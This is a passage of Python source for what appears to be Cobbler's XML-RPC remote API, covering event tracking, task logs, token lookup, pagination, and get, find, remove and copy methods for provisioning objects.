[read_by_who] ]\n\n        :param for_user: (Optional) Filter events the user has not seen yet. If left unset, it will return all events.\n        :return: A dictionary with all the events (or all filtered events).\n        \"\"\"\n        # return only the events the user has not seen\n        self.events_filtered = {}\n        for (k, x) in list(self.events.items()):\n            if for_user in x[3]:\n                pass\n            else:\n                self.events_filtered[k] = x\n\n        # mark as read so user will not get events again\n        if for_user is not None and for_user != \"\":\n            for (k, x) in list(self.events.items()):\n                if for_user in x[3]:\n                    pass\n                else:\n                    self.events[k][3].append(for_user)\n\n        return self.events_filtered\n\n    def get_event_log(self, event_id: str) -> str:\n        \"\"\"\n        Returns the contents of a task log. Events that are not task-based do not have logs.\n\n        :param event_id: The event-id generated by Cobbler.\n        :return: The event log or a ``?``.\n        \"\"\"\n        event_id = str(event_id).replace(\"..\", \"\").replace(\"/\", \"\")\n        path = \"/var/log/cobbler/tasks/%s.log\" % event_id\n        self._log(\"getting log for %s\" % event_id)\n        if os.path.exists(path):\n            fh = open(path, \"r\")\n            data = str(fh.read())\n            fh.close()\n            return data\n        else:\n            return \"?\"\n\n    def __generate_event_id(self, optype: str) -> str:\n        \"\"\"\n        Generate an event id based on the current timestamp\n\n        :param optype: Append an additional str to the event-id\n        :return: An id in the format: \"<4 digit year>-<2 digit month>-<two digit day>_<2 digit hour><2 digit minute>\n                 <2 digit second>_<optional string>\"\n        \"\"\"\n        (year, month, day, hour, minute, second, weekday, julian, dst) = time.localtime()\n        return \"%04d-%02d-%02d_%02d%02d%02d_%s\" % (year, month, day, hour, minute, second, optype)\n\n    def _new_event(self, name: str):\n        \"\"\"\n        Generate a new event in the in memory event list.\n\n        :param name: The name of the event.\n        \"\"\"\n        event_id = self.__generate_event_id(\"event\")\n        event_id = str(event_id)\n        self.events[event_id] = [float(time.time()), str(name), EVENT_INFO, []]\n\n    def __start_task(self, thr_obj_fn, token: str, role_name: str, name: str, args: dict, on_done=None):\n        \"\"\"\n        Starts a new background task.\n\n        :param thr_obj_fn: function handle to run in a background thread\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method. All\n                      tasks require tokens.\n        :param role_name: used to check token against authn/authz layers\n        :param name: display name to show in logs/events\n        :param args: usually this is a single dict, containing options\n        :param on_done: an optional second function handle to run after success (and only success)\n        :return: a task id.\n        \"\"\"\n        self.check_access(token, role_name)\n        event_id = self.__generate_event_id(role_name)  # use short form for logfile suffix\n        event_id = str(event_id)\n        self.events[event_id] = [float(time.time()), str(name), EVENT_RUNNING, []]\n\n        self._log(\"start_task(%s); event_id(%s)\" % (name, event_id))\n\n        thr_obj = CobblerThread(event_id, self, args, role_name, self.api)\n        thr_obj._run = thr_obj_fn\n        if on_done is not None:\n            thr_obj.on_done = on_done.__get__(thr_obj, CobblerThread)\n        thr_obj.start()\n        return event_id\n\n    def _set_task_state(self, thread_obj, event_id: str, new_state):\n        \"\"\"\n        Set the state of the task. (For internal use only)\n\n        :param thread_obj: Not known what this actually does.\n        :param event_id: The event id, generated by __generate_event_id()\n        :param new_state: The new state of the task.\n        \"\"\"\n        event_id = str(event_id)\n        if event_id in self.events:\n            self.events[event_id][2] = new_state\n            self.events[event_id][3] = []  # clear the list of who has read it\n        if thread_obj is not None:\n            if new_state == EVENT_COMPLETE:\n                thread_obj.logger.info(\"### TASK COMPLETE ###\")\n            if new_state == EVENT_FAILED:\n                thread_obj.logger.error(\"### TASK FAILED ###\")\n\n    def get_task_status(self, event_id: str):\n        \"\"\"\n        Get the current status of the task.\n\n        :param event_id: The unique id of the task.\n        :return: The event status.\n        \"\"\"\n        event_id = str(event_id)\n        if event_id in self.events:\n            return self.events[event_id]\n        else:\n            raise CX(\"no event with that id\")\n\n    def last_modified_time(self, token=None) -> float:\n        \"\"\"\n        Return the time of the last modification to any object. Used to verify from a calling application that no\n        Cobbler objects have changed since last check. This method is implemented in the module api under the same name.\n\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: 0 if there is no file where the information required for this method is saved.\n        \"\"\"\n        return self.api.last_modified_time()\n\n    def ping(self) -> bool:\n        \"\"\"\n        Deprecated method. Now does nothing.\n\n        :return: Always True\n        \"\"\"\n        return True\n\n    def get_user_from_token(self, token: str):\n        \"\"\"\n        Given a token returned from login, return the username that logged in with it.\n\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The username if the token was valid.\n        :raises CX: If the token supplied to the function is invalid.\n        :raises ValueError: In case \"token\" did not fulfil the requirements to be a token.\n        \"\"\"\n        if not CobblerXMLRPCInterface.__is_token(token):\n            raise ValueError(\"\\\"token\\\" did not have the correct format or type!\")\n        if token not in self.token_cache:\n            raise CX(\"invalid token: %s\" % token)\n        else:\n            return self.token_cache[token][1]\n\n    def _log(self, msg: str, token: Optional[str] = None, name: Optional[str] = None, object_id: Optional[str] = None,\n             attribute: Optional[str] = None, debug: bool = False, error: bool = False):\n        \"\"\"\n        Helper function to write data to the log file from the XMLRPC remote implementation.\n        Takes various optional parameters that should be supplied when known.\n\n        :param msg: The message to log.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param name: The name of the object should be supplied when it is known.\n        :param object_id: The object id should be supplied when it is known.\n        :param attribute: Additional attributes should be supplied if known.\n        :param debug: If the message logged is a debug message.\n        :param error: If the message logged is an error message.\n        \"\"\"\n        if not all((isinstance(error, bool), isinstance(debug, bool), isinstance(msg, str))):\n            return\n        # add the user editing the object, if supplied\n        m_user = \"?\"\n        if token is not None:\n            try:\n                m_user = self.get_user_from_token(token)\n            except:\n                # invalid or expired token?\n                m_user = \"???\"\n        msg = \"REMOTE %s; user(%s)\" % (msg, m_user)\n\n        if name is not None:\n            if not validate_obj_name(name):\n                return\n            msg = \"%s; name(%s)\" % (msg, name)\n\n        if object_id is not None:\n            if not validate_obj_id(object_id):\n                return\n            msg = \"%s; object_id(%s)\" % (msg, object_id)\n\n        # add any attributes being modified, if any\n        if attribute:\n            if (isinstance(attribute, str) and attribute.isidentifier()) or keyword.iskeyword(attribute):\n                return\n            msg = \"%s; attribute(%s)\" % (msg, attribute)\n\n        # log to the correct logger\n        if error:\n            self.logger.error(msg)\n        elif debug:\n            self.logger.debug(msg)\n        else:\n            self.logger.info(msg)\n\n    def __sort(self, data, sort_field: Optional[str] = None):\n        \"\"\"\n        Helper function used by the various find/search functions to return object representations in order.\n\n        :param data: The data to sort.\n        :param sort_field: If the field contained in this starts with \"!\" then this sorts backwards.\n        :return: The data sorted by the ``sort_field``.\n        \"\"\"\n        sort_fields = [\"name\"]\n        sort_rev = False\n        if sort_field is not None:\n            if sort_field.startswith(\"!\"):\n                sort_field = sort_field[1:]\n                sort_rev = True\n            sort_fields.insert(0, sort_field)\n        sortdata = [(x.sort_key(sort_fields), x) for x in data]\n        if sort_rev:\n            sortdata.sort(reverse=True)\n        else:\n            sortdata.sort()\n        return [x for (key, x) in sortdata]\n\n    def __paginate(self, data, page=1, items_per_page=25, token=None):\n        \"\"\"\n        Helper function to support returning parts of a selection, for example, for use in a web app where only a part\n        of the results are to be presented on each screen.\n\n        :param data: The data to paginate.\n        :param page: The page to show.\n        :param items_per_page: The number of items per page.\n        :param token: The API-token obtained via the login() method.\n        :return: The paginated items.\n        \"\"\"\n        default_page = 1\n        default_items_per_page = 25\n\n        try:\n            page = int(page)\n            if page < 1:\n                page = default_page\n        except:\n            page = default_page\n        try:\n            items_per_page = int(items_per_page)\n            if items_per_page <= 0:\n                items_per_page = default_items_per_page\n        except:\n            items_per_page = default_items_per_page\n\n        num_items = len(data)\n        num_pages = ((num_items - 1) // items_per_page) + 1\n        if num_pages == 0:\n            num_pages = 1\n        if page > num_pages:\n            page = num_pages\n        start_item = (items_per_page * (page - 1))\n        end_item = start_item + items_per_page\n        if start_item > num_items:\n            start_item = num_items - 1\n        if end_item > num_items:\n            end_item = num_items\n        data = data[start_item:end_item]\n\n        if page > 1:\n            prev_page = page - 1\n        else:\n            prev_page = None\n        if page < num_pages:\n            next_page = page + 1\n        else:\n            next_page = None\n\n        return (data, {\n            'page': page,\n            'prev_page': prev_page,\n            'next_page': next_page,\n            'pages': list(range(1, num_pages + 1)),\n            'num_pages': num_pages,\n            'num_items': num_items,\n            'start_item': start_item,\n            'end_item': end_item,\n            'items_per_page': items_per_page,\n            'items_per_page_list': [10, 20, 50, 100, 200, 500],\n        })\n\n    def __get_object(self, object_id: str):\n        \"\"\"\n        Helper function. Given an object id, return the actual object.\n\n        :param object_id: The id for the object to retrieve.\n        :return: The item to the corresponding id.\n        \"\"\"\n        if object_id.startswith(\"___NEW___\"):\n            return self.object_cache[object_id][1]\n        (otype, oname) = object_id.split(\"::\", 1)\n        return self.api.get_item(otype, oname)\n\n    def get_item(self, what: str, name: str, flatten=False):\n        \"\"\"\n        Returns a dict describing a given object.\n\n        :param what: \"distro\", \"profile\", \"system\", \"image\", \"repo\", etc\n        :param name: the object name to retrieve\n        :param flatten: reduce dicts to string representations (True/False)\n        :return: The item or None.\n        \"\"\"\n        self._log(\"get_item(%s,%s)\" % (what, name))\n        item = self.api.get_item(what, name)\n        if item is not None:\n            item = item.to_dict()\n        if flatten:\n            item = utils.flatten(item)\n        return self.xmlrpc_hacks(item)\n\n    def get_distro(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a distribution.\n\n        :param name: The name of the distribution to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"distro\", name, flatten=flatten)\n\n    def get_profile(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a profile.\n\n        :param name: The name of the profile to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"profile\", name, flatten=flatten)\n\n    def get_system(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a system.\n\n        :param name: The name of the system to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"system\", name, flatten=flatten)\n\n    def get_repo(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a repository.\n\n        :param name: The name of the repository to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"repo\", name, flatten=flatten)\n\n    def get_image(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get an image.\n\n        :param name: The name of the image to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"image\", name, flatten=flatten)\n\n    def get_mgmtclass(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a management class.\n\n        :param name: The name of the management class to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"mgmtclass\", name, flatten=flatten)\n\n    def get_package(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a package.\n\n        :param name: The name of the package to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"package\", name, flatten=flatten)\n\n    def get_file(self, name: str, flatten=False, token=None, **rest):\n        \"\"\"\n        Get a file.\n\n        :param name: The name of the file to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"file\", name, flatten=flatten)\n\n    def get_menu(self, name: str, flatten: bool = False, token=None, **rest):\n        \"\"\"\n        Get a menu.\n\n        :param name: The name of the file to get.\n        :param flatten: If the item should be flattened.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: Not used with this method currently.\n        :return: The item or None.\n        \"\"\"\n        return self.get_item(\"menu\", name, flatten=flatten)\n\n    def get_items(self, what: str):\n        \"\"\"\n        Individual list elements are the same for get_item.\n\n        :param what: is the name of a Cobbler object type, as described for get_item.\n        :return: This returns a list of dicts.\n        \"\"\"\n        items = [x.to_dict() for x in self.api.get_items(what)]\n        return self.xmlrpc_hacks(items)\n\n    def get_item_names(self, what: str):\n        \"\"\"\n        This is just like get_items, but transmits less data.\n\n        :param what: is the name of a Cobbler object type, as described for get_item.\n        :return: Returns a list of object names (keys) for the given object type.\n        \"\"\"\n        return [x.name for x in self.api.get_items(what)]\n\n    def get_distros(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all distributions.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list with all distros.\n        \"\"\"\n        return self.get_items(\"distro\")\n\n    def get_profiles(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all profiles.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list with all profiles.\n        \"\"\"\n        return self.get_items(\"profile\")\n\n    def get_systems(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all Systems.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all systems.\n        \"\"\"\n        return self.get_items(\"system\")\n\n    def get_repos(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all repositories.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all repositories.\n        \"\"\"\n        return self.get_items(\"repo\")\n\n    def get_images(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all images.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all images.\n        \"\"\"\n        return self.get_items(\"image\")\n\n    def get_mgmtclasses(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all managementclasses.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all managementclasses.\n        \"\"\"\n        return self.get_items(\"mgmtclass\")\n\n    def get_packages(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all packages.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all packages tracked in Cobbler.\n        \"\"\"\n        return self.get_items(\"package\")\n\n    def get_files(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all files.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all files.\n        \"\"\"\n        return self.get_items(\"file\")\n\n    def get_menus(self, page=None, results_per_page=None, token=None, **rest):\n        \"\"\"\n        This returns all menus.\n\n        :param page: This parameter is not used currently.\n        :param results_per_page: This parameter is not used currently.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: The list of all files.\n        \"\"\"\n        return self.get_items(\"menu\")\n\n    def find_items(self, what: str, criteria: Optional[dict] = None, sort_field=None, expand: bool = True) -> list:\n        \"\"\"Works like get_items but also accepts criteria as a dict to search on.\n\n        Example: ``{ \"name\" : \"*.example.org\" }``\n\n        Wildcards work as described by 'pydoc fnmatch'.\n\n        :param what: The object type to find.\n        :param criteria: The criteria an item needs to match.\n        :param sort_field: The field to sort the results after.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :returns: A list of dicts.\n        \"\"\"\n        if criteria is None:\n            criteria = {}\n        # self._log(\"find_items(%s); criteria(%s); sort(%s)\" % (what, criteria, sort_field))\n        if \"name\" in criteria:\n            name = criteria.pop(\"name\")\n            items = self.api.find_items(what, criteria=criteria, name=name)\n        else:\n            items = self.api.find_items(what, criteria=criteria)\n        items = self.__sort(items, sort_field)\n        if not expand:\n            items = [x.name for x in items]\n        else:\n            items = [x.to_dict() for x in items]\n        return self.xmlrpc_hacks(items)\n\n    def find_distro(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a distro matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All distributions which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"distro\", criteria, expand=expand)\n\n    def find_profile(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a profile matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All profiles which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"profile\", criteria, expand=expand)\n\n    def find_system(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a system matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All systems which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"system\", criteria, expand=expand)\n\n    def find_repo(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a repository matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All repositories which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"repo\", criteria, expand=expand)\n\n    def find_image(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find an image matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All images which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"image\", criteria, expand=expand)\n\n    def find_mgmtclass(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a management class matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All management classes which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"mgmtclass\", criteria, expand=expand)\n\n    def find_package(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a package matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All packages which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"package\", criteria, expand=expand)\n\n    def find_file(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a file matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All files which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"file\", criteria, expand=expand)\n\n    def find_menu(self, criteria: Optional[dict] = None, expand=False, token=None, **rest):\n        \"\"\"\n        Find a menu matching certain criteria.\n\n        :param criteria: The criteria a distribution needs to match.\n        :param expand: Not only get the names but also the complete object in form of a dict.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is not used currently.\n        :return: All files which have matched the criteria.\n        \"\"\"\n        return self.find_items(\"menu\", criteria, expand=expand)\n\n    def find_items_paged(self, what: str, criteria: Optional[dict] = None, sort_field: Optional[str] = None,\n                         page=1, items_per_page=25, token: Optional[str] = None):\n        \"\"\"\n        Returns a list of dicts as with find_items but additionally supports returning just a portion of the total\n        list, for instance in supporting a web app that wants to show a limited amount of items per page.\n\n        :param what: The object type to find.\n        :param criteria: The criteria a distribution needs to match.\n        :param sort_field: The field to sort the results after.\n        :param page: The page to return\n        :param items_per_page: The number of items per page.\n        :param token: The API-token obtained via the login() method.\n        :return: The found items.\n        \"\"\"\n        self._log(\"find_items_paged(%s); criteria(%s); sort(%s)\" % (what, criteria, sort_field), token=token)\n        if criteria is None:\n            items = self.api.get_items(what)\n        else:\n            items = self.api.find_items(what, criteria=criteria)\n        items = self.__sort(items, sort_field)\n        (items, pageinfo) = self.__paginate(items, page, items_per_page)\n        items = [x.to_dict() for x in items]\n        return self.xmlrpc_hacks({\n            'items': items,\n            'pageinfo': pageinfo\n        })\n\n    def has_item(self, what: str, name: str, token: Optional[str] = None):\n        \"\"\"\n        Returns True if a given collection has an item with a given name, otherwise returns False.\n\n        :param what: The collection to search through.\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: True if item was found, otherwise False.\n        \"\"\"\n        self._log(\"has_item(%s)\" % what, token=token, name=name)\n        found = self.api.get_item(what, name)\n        if found is None:\n            return False\n        else:\n            return True\n\n    def get_item_handle(self, what: str, name: str, token=None):\n        \"\"\"\n        Given the name of an object (or other search parameters), return a reference (object id) that can be used with\n        ``modify_*`` functions or ``save_*`` functions to manipulate that object.\n\n        :param what: The collection where the item is living in.\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        found = self.api.get_item(what, name)\n        if found is None:\n            raise CX(\"internal error, unknown %s name %s\" % (what, name))\n        return \"%s::%s\" % (what, found.name)\n\n    def get_distro_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a distribution which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate\n        it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"distro\", name, token)\n\n    def get_profile_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a profile which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"profile\", name, token)\n\n    def get_system_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a system which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"system\", name, token)\n\n    def get_repo_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a repository which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"repo\", name, token)\n\n    def get_image_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for an image which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"image\", name, token)\n\n    def get_mgmtclass_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a management class which allows you to use the functions ``modify_*`` or ``save_*`` to\n        manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"mgmtclass\", name, token)\n\n    def get_package_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a package which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"package\", name, token)\n\n    def get_file_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a file which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"file\", name, token)\n\n    def get_menu_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a menu which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"menu\", name, token)\n\n    def remove_item(self, what: str, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes an item from a collection.\n        Note that this requires the name of the distro, not an item handle.\n\n        :param what: The item type of the item to remove.\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        self._log(\"remove_item (%s, recursive=%s)\" % (what, recursive), name=name, token=token)\n        obj = self.api.get_item(what, name)\n        self.check_access(token, \"remove_%s\" % what, obj)\n        self.api.remove_item(what, name, delete=True, with_triggers=True, recursive=recursive)\n        return True\n\n    def remove_distro(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a distribution from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"distro\", name, token, recursive)\n\n    def remove_profile(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a profile from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"profile\", name, token, recursive)\n\n    def remove_system(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a system from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"system\", name, token, recursive)\n\n    def remove_repo(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a repository from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"repo\", name, token, recursive)\n\n    def remove_image(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes an image from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"image\", name, token, recursive)\n\n    def remove_mgmtclass(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a managementclass from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"mgmtclass\", name, token, recursive)\n\n    def remove_package(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a package from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"package\", name, token, recursive)\n\n    def remove_file(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a file from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"file\", name, token, recursive)\n\n    def remove_menu(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a menu from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"menu\", name, token, recursive)\n\n    def copy_item(self, what: str, object_id: str, newname: str, token: str):\n        \"\"\"\n        Creates a new object that matches an existing object, as specified by an id.\n\n        :param what: The item type which should be copied.\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        self._log(\"copy_item(%s)\" % what, object_id=object_id, token=token)\n        self.check_access(token, \"copy_%s\" % what)\n        obj = self.__get_object(object_id)\n        self.api.copy_item(what, obj, newname)\n        return True\n\n    def copy_distro(self, object_id: str, newname: str, token=None):\n        \"\"\"\n        Copies a distribution and renames it afterwards.\n\n        :param object_id: The 